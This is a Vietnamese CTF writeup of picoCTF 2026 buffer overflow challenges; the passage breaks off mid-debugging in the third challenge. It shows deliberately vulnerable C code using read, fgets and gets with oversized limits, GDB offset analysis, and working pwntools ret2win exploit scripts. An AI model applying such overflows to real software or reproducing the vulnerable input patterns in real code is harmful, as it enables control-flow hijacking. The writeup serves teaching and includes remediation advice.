---
title: picoCTF 2026 - Pwnable
description: Writeup for the picoCTF 2026 Pwnable challenges
pubDate: April 23 2026
heroImage: /assets/layouts/homepage/theme2.jpg
category: ["CTF Writeup"]
tags: ["Writeup", "CTF", "Binary Exploitation"]
draft: false
---

## Echo Escape 1

**Category:** Binary Exploitation  |
**Point:** 300 |

> The "secure" echo service welcomes you politely... but what if you don't stay polite? Can you make it reveal the hidden flag?

```bash
nc mysterious-sea.picoctf.net <port>
```
Bạn cần truy cập vào thử thách trên pico để mở instance

### Tóm tắt
Thử thách được tạo ra với một file binary, code C cùng một server yêu cầu nhập input. Lỗ hổng Buffer Overflow dùng hàm ```read()``` đọc số lượng đầu vào lớn hơn buffer + Không Canaries vì vậy dùng kĩ thuật ret2win để khai thác ra flag

Writeup này được viết bởi chillfish

### 1. Static Reversing
#### Chạy thử

Khi kết nối vào server, nó yêu cầu nhập tên, nếu nhập số quá lớn sẽ đơ, còn không thì báo lại tên vừa nhập
```bash
Welcome to the secure echo service!
Please enter your name: 999999999999999999999999999999999999999999999999999999

Welcome to the secure echo service!
Please enter your name: 99999999999999
Hello, 999999999999999

Thank you for using our service.
```
#### Hiểu code C

<details>
<summary>Bấm vào để xem full code</summary>

```C
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void win() {
		FILE *fp = fopen("flag.txt", "rb");
		if (!fp) {
				perror("[!] Failed to open flag.txt");
				return;
		}

		char buffer[128];
		size_t n = fread(buffer, 1, sizeof(buffer), fp);
		fwrite(buffer, 1, n, stdout);
		fflush(stdout);
		printf("\n");
		fclose(fp);
}

int main() {
		char buf[32];

		printf("Welcome to the secure echo service!\n");
		printf("Please enter your name: ");
		fflush(stdout);

		read(0, buf, 128);

		printf("Hello, %s\n", buf);
		printf("Thank you for using our service.\n");

		return 0;
}
```
</details>

Bỏ qua những lệnh gọi thư viện, ta đến với function ```win()```,  nó mở ra đọc flag, nếu flag NULL (không tồn tại, không có quyền) sẽ in lỗi. Tiếp đến, đặt buffer 128bytes, dùng lệnh read đưa flag vào buffer rồi fwrite n byte dữ liệu từ buffer ra stdout (Dùng n trung gian để tối ưu hệ thống). Cuối cùng dùng lệnh ```fflush(stdout)``` để đẩy hết đầu ra ngay lập tức mà không cần chờ chương trình chạy xong mới hiện (Khi BOF chương trình có thể terminated và lỗi toàn bộ khiến flag sẽ không được hiện ra)
```C
void win() {
		FILE *fp = fopen("flag.txt", "rb");
		if (!fp) {
				perror("[!] Failed to open flag.txt");
				return;
		}

		char buffer[128];
		size_t n = fread(buffer, 1, sizeof(buffer), fp);
		fwrite(buffer, 1, n, stdout);
		fflush(stdout);
		printf("\n");
		fclose(fp);
}
```
Và phần thực thi chính của chương trình, tạo buffer 32, đẩy hết đầu ra bằng fflush, dùng lệnh read đọc vào buffer với số lượng tới 128 byte và end ngắt chương trình
```C
int main() {
		char buf[32];

		printf("Welcome to the secure echo service!\n");
		printf("Please enter your name: ");
		fflush(stdout);

		read(0, buf, 128);

		printf("Hello, %s\n", buf);
		printf("Thank you for using our service.\n");

		return 0;
}
```
#### Check bảo mật
Ta dùng lệnh ```checksec vuln``` để xem cơ chế bảo mật của bài này
```bash
[*] '/home/flrsh/workspace5/vuln'
		Arch:       amd64-64-little
		RELRO:      Partial RELRO
		Stack:      No canary found     -> No Canaries -> BOF
		NX:         NX enabled
		PIE:        No PIE (0x400000)   -> No PIE -> không random address
		SHSTK:      Enabled
		IBT:        Enabled
		Stripped:   No
```
Như code đã phân tích ở trên rằng bài này không có Custom Canary, thêm vào đó địa chỉ process không thay đổi mỗi phiên chạy (No PIE) ta có thể kết luận rằng kĩ thuật khai thác là ret2win

### 2. Dynamic Debugging
Sử dụng công cụ GDB, bằng lệnh gdb vuln để phân tích luồng thực thi bên trong code
#### p win
Vì đã biết kĩ thuật khai thác, ta cần tìm được địa chỉ hàm win trước, sử dụng gdb để debug file thực thi chính, sau đó dùng lệnh p win để show ra địa chỉ hàm ```win()``` và nhận lại kết quả là địa chỉ **0x401256**
```bash
gef➤  p win
$1 = {<text variable, no debug info>} 0x401256 <win>
```
#### Nhập input
Dùng lệnh ```disas main``` để xem code asm:
```bash
Dump of assembler code for function main:
	 0x00000000004012fb <+0>:     endbr64
	 0x00000000004012ff <+4>:     push   rbp
	 0x0000000000401300 <+5>:     mov    rbp,rsp
	 0x0000000000401303 <+8>:     sub    rsp,0x20
	 0x0000000000401307 <+12>:    lea    rdi,[rip+0xd22]        # 0x402030
	 0x000000000040130e <+19>:    call   0x4010e0 <puts@plt>
	 0x0000000000401313 <+24>:    lea    rdi,[rip+0xd3a]        # 0x402054
	 0x000000000040131a <+31>:    mov    eax,0x0
	 0x000000000040131f <+36>:    call   0x401110 <printf@plt>
	 0x0000000000401324 <+41>:    mov    rax,QWORD PTR [rip+0x2d4d]        # 0x404078 <stdout@@GLIBC_2.2.5>
	 0x000000000040132b <+48>:    mov    rdi,rax
	 0x000000000040132e <+51>:    call   0x401130 <fflush@plt>
	 0x0000000000401333 <+56>:    lea    rax,[rbp-0x20]
	 0x0000000000401337 <+60>:    mov    edx,0x80
	 0x000000000040133c <+65>:    mov    rsi,rax
	 0x000000000040133f <+68>:    mov    edi,0x0
	 0x0000000000401344 <+73>:    call   0x401120 <read@plt>
	 0x0000000000401349 <+78>:    lea    rax,[rbp-0x20]
	 0x000000000040134d <+82>:    mov    rsi,rax
	 0x0000000000401350 <+85>:    lea    rdi,[rip+0xd16]        # 0x40206d
	 0x0000000000401357 <+92>:    mov    eax,0x0
	 0x000000000040135c <+97>:    call   0x401110 <printf@plt>
	 0x0000000000401361 <+102>:   lea    rdi,[rip+0xd10]        # 0x402078
	 0x0000000000401368 <+109>:   call   0x4010e0 <puts@plt>
	 0x000000000040136d <+114>:   mov    eax,0x0
	 0x0000000000401372 <+119>:   leave
	 0x0000000000401373 <+120>:   ret
End of assembler dump.
```
Đặt breakpoint tại lệnh read (b *0x0000000000401344) rồi dùng r và nhập một payload khoảng 60 byte (dùng pwn cyclic 60)

Địa chỉ ngay bên dưới $rbp (hay gọi là saved rbp) chính là return address (rbp+8 là 0x0028 vì đây là kiến trúc 64 bit), bị ghi đề bởi giá trị thử nghiệm ở trên
```bash
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9c0│+0x0000: "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"    ← $rsp, $rsi
0x00007fffffffd9c8│+0x0008: "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"
0x00007fffffffd9d0│+0x0010: 0x6161616661616165
0x00007fffffffd9d8│+0x0018: 0x6161616861616167
0x00007fffffffd9e0│+0x0020: 0x6161616a61616169   ← $rbp
0x00007fffffffd9e8│+0x0028: 0x6161616c6161616b
0x00007fffffffd9f0│+0x0030: 0x6161616e6161616d
0x00007fffffffd9f8│+0x0038: 0x00007f0a6161616f
```
Bạn thấy giá trị nó tràn xuống bên dưới chứ, đó là tràn bộ nhớ, các giá trị sẽ tràn xuống và chiếm dụng tài nguyên các phần bộ nhớ khác, từ đó ta có thể thay thế giá trị của return address để nó trỏ đến địa chỉ mà mình muốn, ở đây ta trỏ tới hàm win()

### 3. Chiến thuật khai thác
Như đã biết trong code C rằng bài này tạo buffer 32 byte rồi read giá trị nhập vào quá lớn so với buffer, nên ta sẽ dùng payload script để ghi đè return address bằng địa chỉ hàm win
Offset chính xác là 32bytes của BUFFER + 8bytes Saved RBP + địa chỉ hàm win
#### Payload
Sử dụng python để viết script cho nhanh gọn

```python
from pwn import *

host = 'mysterious-sea.picoctf.net'
port = #port từ đề bài

p = remote(host, port)

win = p64(0x401256)
payload = b'a'*32 + b'b'*8 + win

p.sendline(payload)

p.interactive()
```

#### Kết quả
```bash
[+] Opening connection to mysterious-sea.picoctf.net on port 59995: Done
[*] Switching to interactive mode
Welcome to the secure echo service!
Please enter your name: Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbV\x12@
Thank you for using our service.
picoCTF{}[*] Got EOF while reading in interactive
```
Tự làm đi nhé baby

### 4. Kết Luận
Lỗ hổng: Sử dụng hàm read đọc giới hạn đầu vào lớn hơn Buffer size

Hậu quả: Bị ghi đè return address dễ dàng

Biện pháp khắc phục:
* Luôn sử dụng sizeof(buf) làm giới hạn cho hàm read
* Bật Stack Canaries để ngăn chặn việc ghi đè trái phép và PIE để làm ngẫu nhiên địa chỉ các hàm, khiến việc tấn công ret2win trở nên khó khăn hơn [Cách bật/tắt ở đây](https://stackoverflow.com/questions/66976137/how-to-enable-disable-canary)

## Echo Escape 2

**Category:** Binary Exploitation  |
**Point:** 300 |

> The developer has learned their lesson from unsafe input functions and tried to secure the program by using fgets(). Unfortunately, they didn't use it correctly. Can you still find a way to read the flag?

```bash
nc dolphin-cove.picoctf.net <port>
```
Bạn cần truy cập vào thử thách trên pico để mở instance

### Tóm tắt
Thử thách được tạo ra với một file binary, code C cùng một server yêu cầu nhập input. Lỗ hổng Buffer Overflow dùng hàm ```fgets()``` đọc số lượng đầu vào lớn hơn buffer + Không Canaries vì vậy dùng kĩ thuật ret2win để khai thác ra flag

Writeup này được viết bởi chillfish

### 1. Static Reversing
#### Chạy thử

Khi kết nối vào server, nó yêu cầu nhập secret key, nếu nhập số quá lớn sẽ đơ, còn không thì báo lại key vừa nhập
```bash
Enter the secret key: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbv

Enter the secret key: aaaaaaaaaaaaaaaaaaaaaaaaaaaa
You entered:, aaaaaaaaaaaaaaaaaaaaaaaaaaaa

Goodbye!
```
#### Hiểu code C

<details>
<summary>Bấm vào để xem full code</summary>

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
		FILE *fp = fopen("flag.txt", "r");
		if (!fp) {
				perror("[!] Could not open flag.txt");
				exit(1);
		}

		char flag[128];
		fgets(flag, sizeof(flag), fp);
		printf("Flag: %s\n", flag);
		fflush(stdout);
		fclose(fp);
}

void vuln() {
		char buf[32];

		printf("Enter the secret key: ");
		fflush(stdout);

		fgets(buf, 128, stdin);

		printf("You entered:, %s\n", buf);
}

int main() {
		vuln();
		puts("Goodbye!");
		return 0;
}
```
</details>

Bỏ qua những lệnh gọi thư viện, ta đến với function ```win()```,  nó mở ra đọc flag, nếu flag NULL (không tồn tại, không có quyền) sẽ in lỗi. Tiếp đến, đặt buffer 128bytes, dùng lệnh fgets đưa flag vào buffer với giới hạn kích thước dữ liệu là size của flag (sizeof(flag)). Cuối cùng dùng lệnh ```fflush(stdout)``` để đẩy hết đầu ra ngay lập tức mà không cần chờ chương trình chạy xong mới hiện (Khi BOF chương trình có thể terminated và lỗi toàn bộ khiến flag sẽ không được hiện ra)
```C
void win() {
		FILE *fp = fopen("flag.txt", "r");
		if (!fp) {
				perror("[!] Could not open flag.txt");
				exit(1);
		}

		char flag[128];
		fgets(flag, sizeof(flag), fp);
		printf("Flag: %s\n", flag);
		fflush(stdout);
		fclose(fp);
}
```
Hàm vuln sẽ là hàm được quan tâm nhất vì hàm main chỉ khai báo hàm này rồi exit. Đầu tiên đặt bộ đệm buf 32bytes, dùng fflush(stdout) để xuất dữ liệu ngay trước khi chương trình death, kế đến dùng lệnh fgets; trước tiên ta cần biết fgets là hàm sẽ đọc dữ liệu chuỗi chủ động cho đến khi gặp '\n', cấu trúc fgets sẽ là fgets(đích, giới hạn kích thước dữ liệu, nơi lấy) hoặc bạn có thể [xem thêm tại đây](https://www.geeksforgeeks.org/c/fgets-function-in-c/)

Như vậy ta có thể thấy fgets được cấp một giới hạn quá lớn (128) so với buf được cấp (32). Mặc du fgets nếu như biết sử dụng sizeof như hàm trên thì rất an toàn, còn nếu đặt như hiện tại sẽ tạo ra lỗ hổng Buffer Overflow, có thể dùng các kí tự rác đè lên bộ đệm buf rồi gán các giá trị đè qua saved ebp và return address để trỏ vào một địa chỉ mong muốn
```C
void vuln() {
		char buf[32];

		printf("Enter the secret key: ");
		fflush(stdout);

		fgets(buf, 128, stdin);

		printf("You entered:, %s\n", buf);
}
```
#### Check bảo mật
Ta dùng lệnh ```checksec vuln``` để xem cơ chế bảo mật của bài này
```bash
[*] '/home/flrsh/workspace5/vuln'
		Arch:       i386-32-little      -> saved ebp chỉ có 4 bytes, và return address cũng 32bits
		RELRO:      Partial RELRO
		Stack:      No canary found     -> không custom Canary -> dễ bypass qua saved ebp -> ret2win
		NX:         NX enabled
		PIE:        No PIE (0x8048000)  -> không ngẫu nhiên địa chỉ -> dễ tính offset
		SHSTK:      Enabled
		IBT:        Enabled
		Stripped:   No
```
Như code đã phân tích ở trên rằng bài này không có Custom Canary, thêm vào đó địa chỉ process không thay đổi mỗi phiên chạy (No PIE) ta có thể kết luận rằng kĩ thuật khai thác là ret2win

### 2. Dynamic Debugging
Sử dụng công cụ GDB, bằng lệnh gdb vuln để phân tích luồng thực thi bên trong code
#### p win
Vì đã biết kĩ thuật khai thác, ta cần tìm được địa chỉ hàm win trước, sử dụng gdb để debug file thực thi chính, sau đó dùng lệnh p win để show ra địa chỉ hàm ```win()``` và nhận lại kết quả là địa chỉ **0x8049276**
```bash
gef➤  p win
$1 = {<text variable, no debug info>} 0x8049276 <win>
```
#### vuln
Vì chìa khóa giải bài này nằm ở hàm vuln (nơi chứa bug và địa chỉ ebp cần thiết) ta sẽ dùng lệnh disas vuln để xem qua code của hàm này:
```bash
Dump of assembler code for function vuln:
	 0x08049328 <+0>:     endbr32
	 0x0804932c <+4>:     push   ebp
	 0x0804932d <+5>:     mov    ebp,esp
	 0x0804932f <+7>:     push   ebx
	 0x08049330 <+8>:     sub    esp,0x24
	 0x08049333 <+11>:    call   0x80491b0 <__x86.get_pc_thunk.bx>
	 0x08049338 <+16>:    add    ebx,0x2cc8
	 0x0804933e <+22>:    sub    esp,0xc
	 0x08049341 <+25>:    lea    eax,[ebx-0x1fc7]
	 0x08049347 <+31>:    push   eax
	 0x08049348 <+32>:    call   0x80490d0 <printf@plt>
	 0x0804934d <+37>:    add    esp,0x10
	 0x08049350 <+40>:    mov    eax,DWORD PTR [ebx-0x4]
	 0x08049356 <+46>:    mov    eax,DWORD PTR [eax]
	 0x08049358 <+48>:    sub    esp,0xc
	 0x0804935b <+51>:    push   eax
	 0x0804935c <+52>:    call   0x80490e0 <fflush@plt>
	 0x08049361 <+57>:    add    esp,0x10
	 0x08049364 <+60>:    mov    eax,DWORD PTR [ebx-0x8]
	 0x0804936a <+66>:    mov    eax,DWORD PTR [eax]
	 0x0804936c <+68>:    sub    esp,0x4
	 0x0804936f <+71>:    push   eax
	 0x08049370 <+72>:    push   0x80
	 0x08049375 <+77>:    lea    eax,[ebp-0x28]
	 0x08049378 <+80>:    push   eax
	 0x08049379 <+81>:    call   0x80490f0 <fgets@plt>
	 0x0804937e <+86>:    add    esp,0x10
	 0x08049381 <+89>:    sub    esp,0x8
	 0x08049384 <+92>:    lea    eax,[ebp-0x28]
	 0x08049387 <+95>:    push   eax
	 0x08049388 <+96>:    lea    eax,[ebx-0x1fb0]
	 0x0804938e <+102>:   push   eax
	 0x0804938f <+103>:   call   0x80490d0 <printf@plt>
	 0x08049394 <+108>:   add    esp,0x10
	 0x08049397 <+111>:   nop
	 0x08049398 <+112>:   mov    ebx,DWORD PTR [ebp-0x4]
	 0x0804939b <+115>:   leave
	 0x0804939c <+116>:   ret
End of assembler dump.
```
Ồ đoạn này rất khả nghi, vì tôi không hiểu code asm lắm nên tôi sẽ diện phần này vào là offset tiềm năng (ebp-0x28), nhưng cần phải làm một số bước khác để tính toán chắc chắn offset của bài
```bash
	 0x08049375 <+77>:    lea    eax,[ebp-0x28]
	 0x08049378 <+80>:    push   eax
	 0x08049379 <+81>:    call   0x80490f0 <fgets@plt>
```
Để kiểm chứng, tôi dùng ```pattern create 60``` để tạo chuỗi số ngẫu nhiên 60bytes để gửi input
```bash
gef➤  pattern create 60
[+] Generating a pattern of 60 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
```
Tôi đặt breakpoint vào địa chỉ lệnh lea ở trên (b *vuln+77) và run chương trình (r), dùng ni(next instruction) rồi xem các thanh ghi eax, ebp bằng ```i r eax ebp```
```bash
gef➤  i r eax ebp
eax            0xffffcb80          0xffffcb80
ebp            0xffffcba8          0xffffcba8
```
eax giờ chứa địa chỉ tại ebp-0x28 nếu trừ thì chắc chắn ra 0x28 rồi, còn ebp thì ở định buffer thực ra ở bước này ta đã xác định được offset rồi, nhưng để thuyết phục hơn ta dùng một cách tính offset khác dễ dàng hơn bằng công cụ của GEF

Tôi dùng continue(c) để chạy đến đoạn nhập input, rồi nhập chuỗi tạo ban này và nhập vào. Sau khi nhập thì chương trình sẽ bị lỗi SIGSEGV
```bash
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x4c
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x0
$edx   : 0x0
$esp   : 0xffffcbb0  →  "maaanaaaoaaa\n"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x080493f0  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcbb0│+0x0000: "maaanaaaoaaa\n"     ← $esp
0xffffcbb4│+0x0004: "naaaoaaa\n"
0xffffcbb8│+0x0008: "oaaa\n"
0xffffcbbc│+0x000c: 0xf7da000a  →  "e_uncompress"
0xffffcbc0│+0x0010: 0x00000000
0xffffcbc4│+0x0014: 0x00000000
0xffffcbc8│+0x0018: 0xf7dbeb59  →   add ebx, 0x1eb2db
0xffffcbcc│+0x001c: 0xf7da5c75  →   add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $eip
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```
Thanh ghi eip tôi thấy đã bị ghi đè ```$eip   : 0x6161616c ("laaa"?)``` (cái địa chỉ này là chứa return address đó), nhưng để tính offset chuẩn ta dùng thêm lệnh ```pattern search $eip```. Lệnh này có tác dụng dựa vào cái pattern create ban đầu và đếm các mốc (bạn thấy chuỗi được tạo có các chữ aaaabaaacaaa abcdef) để đưa ra offset chính xác đến một thanh ghi cụ thể (ở đây tôi chọn eip để chứng minh rằng kiến trúc 32 bit có saved ebp là 4 bytes)
```bash
gef➤  pattern search $eip
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```
Dựa vào cái l để tìm ra chính xác 44 bytes (là 0x28 + 4 bytes của saved ebp)

### 3. Chiến thuật khai thác
Vì bài này sử dụng server kết nối nên tôi sẽ sử dụng payload script để ghi đè địa chỉ win và nhận flag

#### Payload
Dùng python cho tiện, gọn, lẹ
```python
from pwn import *

host = 'dolphin-cove.picoctf.net'
port = #port

p = remote(host, port)

win = p32(0x8049276)
payload = b'a'*40 + b'b'*4 + win

p.sendline(payload)

p.interactive()
```

Kết quả:
```bash
[+] Opening connection to dolphin-cove.picoctf.net on port 52321: Done
[*] Switching to interactive mode
Enter the secret key: You entered:, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbv\x92\x04\x08

Flag: picoCTF{}
[*] Got EOF while reading in interactive
```
Tự làm đi baby

### 4. Kết luận
Lỗ hổng: Buffer Overflow tại hàm vuln(). Sử dụng hàm fgets() có dữ liệu kích thước lớn hơn buf size

Hậu quả: Kẻ tấn công có thể dễ dàng kiểm soát luồng thực thi của chương trình. Bằng cách ghi đè 44 bytes để chiếm quyền điều khiển thanh ghi EIP (Return Address), = kỹ thuật ret2win để nhảy vào hàm win() và tiết lộ Flag

Giải pháp khắc phục:
* Sử dụng sizeof(buf) để đặt giới hạn kích thước tránh cho BOF
* Bật Stack Canaries để chương trình tự động kiểm tra tính toàn vẹn của Stack trước khi kết thúc hàm [Cách bật/tắt ở đây](https://stackoverflow.com/questions/66976137/how-to-enable-disable-canary)
* Bật PIE/ASLR: tra google
* Luôn thực hiện kiểm tra biên (Bounds Checking) đối với mọi dữ liệu đầu vào từ người dùng

## Offset-Cycle

**Category:** Binary Exploitation  |
**Point:** 300 | **For Beginner**

> It's a race against time. Solve the binary exploit ASAP.

```bash
ssh -p <PORT> ctf-player@green-hill.picoctf.net
# Password: password
```
Bạn cần truy cập vào thử thách trên pico để mở instance
### Tóm tắt
Thử thách được tạo ra với một file binary cho phép tạo ra một file C và một file binary chính để chạy. Bên cạnh đó, giới hạn thời gian được áp dụng và được yêu cầu nhập một input chính xác để có được flag

Writeup này được viết bởi chillfish

### 1. Static Reversing
#### Chạy thử
Khi chạy thử file binary được tạo, nó yêu cầu nhập string, với số lượng trong phạm vi buff nó sẽ mặc định nhảy tới 0x8049335, còn nếu tràn qua ret thì nhận input làm return address luôn
```bash
Please enter your string:
99999999999999999999999999999999999999999999999
Okay, time to return... Fingers Crossed... Jumping to 0x8049335

Please enter your string:
99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
Okay, time to return... Fingers Crossed... Jumping to 0x39393939
Segmentation fault (core dumped)
```
#### Hiểu code C

<details>
<summary>Bấm vào để xem full code</summary>

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 38
#define FLAGSIZE 64

void win() {
	char buf[FLAGSIZE];
	FILE *f = fopen("CodeBank/flag.txt","r");
	if (f == NULL) {
		printf("%s %s", "You may not have plenty of time",
										"to solve the challenge.\n");
		exit(0);
	}

	fgets(buf,FLAGSIZE,f);
	printf(buf);
}

void vuln(){
	char buf[BUFSIZE];
	gets(buf);

	printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

	setvbuf(stdout, NULL, _IONBF, 0);

	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	puts("Please enter your string: ");
	vuln();
	return 0;
}
```
</details>

Mấy dòng đầu là gọi hàm và file, cũng như khai báo kích thước của Buffer (Ngẫu nhiên với mỗi file được tạo ra mỗi session), flag thì cố định 64 bytes

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 38
#define FLAGSIZE 64
```
Tiếp theo là hàm đầu tiên được tạo, nó mở file flag và check xem liệu file còn tồn tại (trong giới hạn thời gian) không để ngắt
Hai dòng cuối tôi sẽ giải thích cặn kẽ hơn:

Hàm ```fgets(Nơi lưu, Số lượng đọc, Nơi đọc) có tác dụng đọc mỗi chuỗi kí tự```
[Hiểu fgets](https://www.geeksforgeeks.org/c/fgets-function-in-c/)

Nói chung nó sẽ đọc từ flag.txt theo kích thước của FLAGSIZE-1 vào biến buf (được gọi ở đoạn ```char buf[FLAGSIZE];```)

Còn ```printf(buf)``` thì mắc một lỗi format strings nhưng do lệnh này ở hàm win và sau lệnh gọi flag nên không cần quan tâm nó nữa
```C
void win() {
	char buf[FLAGSIZE];
	FILE *f = fopen("CodeBank/flag.txt","r");
	if (f == NULL) {
		printf("%s %s", "You may not have plenty of time",
										"to solve the challenge.\n");
		exit(0);
	}

	fgets(buf,FLAGSIZE,f);
	printf(buf);
}
```
Hàm cuối này dùng hàm gets(), một hàm dùng để đọc dữ liệu được nhập vào, nhưng nó thiếu kiểm tra độ dài dữ liệu nên nó cho phép ta nhập vào một chuỗi dài hơn 38 bytes đã khai báo ở trên để ghi đè lên các vùng nhớ quan trọng như saved rbp hay return address

[Hiểu gets](https://www.geeksforgeeks.org/c/gets-in-c/)

Flow tiếp theo nó sẽ prinf ra return address của bài qua hàm ```get_return_address()```
```C
void vuln(){
	char buf[BUFSIZE];
	gets(buf);

	printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
Đây là chương trình chính, phần thiết lập buffer này khiến tôi mất kha khá thời gian để hiểu

Đoạn đầu với ```int main(int argc, char **argv){``` khai báo các tham số và vị trí để chương trình tìm đến và chạy đầu tiên

```setvbuf(stdout, NULL, _IONBF, 0)```: là một cơ chế set buffer mode cho chương trình, ở đây dùng _IONF mode (I/O No Buffering), khi có chế độ này, các dữ liệu được truyền thẳng ra màn hình khi được sử dụng, thay vì đợi đầy buffer hoặc dùng các hàm đặc biệt nó mới hiện hết trên màn hình

stdout: dữ liệu cần cấu hình | NULL: hệ thống tự xử lí con trỏ vùng đệm | _IONF: mode | 0: size buffer

```gid_t gid = getegid()``` và ```setresgid(gid, gid, gid)```: Hiểu ngắn gọn thì nó sẽ set permission cho ta như người giữ flag, để tránh permission denied
[Hiểu getegid](https://www.man7.org/linux/man-pages/man2/getgid.2.html)
[Hiểu setresgid](https://linux.die.net/man/2/setresgid)

Theo sau những hàm xử lý luồng dữ liệu là hàm ```puts()``` với nhiệm vụ in ra màn hình chuỗi được cấp. Kế đến gọi hàm ```vuln()``` để người dùng nhập stdin
và rồi return 0; ngắt chương trình
```C
int main(int argc, char **argv){

	setvbuf(stdout, NULL, _IONBF, 0);

	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	puts("Please enter your string: ");
	vuln();
	return 0;
}
```
#### Check bảo mật
```bash
[*] '/home/ctf-player/21'
		Arch:       i386-32-little                   -> Kiến trúc này saved ebp là 4 bytes
		RELRO:      Partial RELRO
		Stack:      No canary found                  -> Không có Canary, dễ dàng thay đổi return address
		NX:         NX unknown - GNU_STACK missing
		PIE:        No PIE (0x8048000)               -> Không thay đổi Offset mỗi lần chạy
		Stack:      Executable
		RWX:        Has RWX segments
		Stripped:   No
```
Như code đã phân tích ở trên rằng bài này không có Custom Canary, thêm vào đó địa chỉ process không thay đổi mỗi phiên chạy (No PIE) ta có thể kết luận rằng kĩ thuật khai thác là ret2win
### 2. Dynamic Debugging
#### p win
Vì đã biết kĩ thuật khai thác, ta cần tìm được địa chỉ hàm win trước, sử dụng gdb để debug file thực thi chính, sau đó dùng lệnh p win để show ra địa chỉ hàm ```win()``` và nhận lại kết quả là địa chỉ **0x80491f6**
```bash
(gdb) p win
$1 = {<text variable, no debug info>} 0x80491f6 <win>
```

#### vuln()
Tiếp tục dùng lệnh ```disas vuln``` để xem các câu lệnh asm và địa chỉ, ta thấy:
```bash
(gdb) disas vuln
Dump of assembler code for function vuln:
	 0x08049281 <+0>:     endbr32
	 0x08049285 <+4>:     push   %ebp
	 0x08049286 <+5>:     mov    %esp,%ebp
	 0x08049288 <+7>:     push   %ebx
	 0x08049289 <+8>:     sub    $0x94,%esp
	 0x0804928f <+14>:    call   0x8049130 <__x86.get_pc_thunk.bx>
	 0x08049294 <+19>:    add    $0x2d6c,%ebx
	 0x0804929a <+25>:    sub    $0xc,%esp
	 0x0804929d <+28>:    lea    -0x96(%ebp),%eax
	 0x080492a3 <+34>:    push   %eax
	 0x080492a4 <+35>:    call   0x8049050 <gets@plt>
	 0x080492a9 <+40>:    add    $0x10,%esp
	 0x080492ac <+43>:    call   0x8049344 <get_return_address>
	 0x080492b1 <+48>:    sub    $0x8,%esp
	 0x080492b4 <+51>:    push   %eax
	 0x080492b5 <+52>:    lea    -0x1fa0(%ebx),%eax
	 0x080492bb <+58>:    push   %eax
	 0x080492bc <+59>:    call   0x8049040 <printf@plt>
	 0x080492c1 <+64>:    add    $0x10,%esp
	 0x080492c4 <+67>:    nop
	 0x080492c5 <+68>:    mov    -0x4(%ebp),%ebx
	 0x080492c8 <+71>:    leave
	 0x080492c9 <+72>:    ret
End of assembler dump.
```
Vì bài này đặt buffersize biến buf, ta có thể tính toán chính xác size thật sự bằng cách lấy địa chỉ ```saved eip - buf address```. Nhưng trước hết để tìm ra địa chỉ buf ta có thể thông qua hàm gets trong code trên. Đây là những thứ ta cần chú ý
```bash
	 0x0804929d <+28>:    lea    -0x96(%ebp),%eax
	 0x080492a3 <+34>:    push   %eax
	 0x080492a4 <+35>:    call   0x8049050 <gets@plt>
```
Ta sẽ đặt breakpoint tại lệnh lea sử dụng ```b *0x0804929d```, như tôi nói lúc trước ```gets()``` sẽ đưa chuỗi được nhập vào nơi chứa cái được yêu cầu(ở đây là ```gets(buf)```) nên tất cả các chuỗi mình nhập sẽ được đưa vào điểm bắt đầu của buffer, cũng là cái ```ebp-0x3a``` ở trên

Để dễ dàng quan sát ta dùng lệnh r sau khi đặt breakpoint, dùng lệnh ```ni``` (next instruction) để cái địa chỉ của ```ebp-0x3a``` được đưa vào thanh ghi eax. Lúc này, dùng lệnh ```info registers $eax``` (i r $eax) để xem giá trị eax store là bao nhiêu
```bash
(gdb) ni
0x080492a3 in vuln ()
(gdb) i r eax
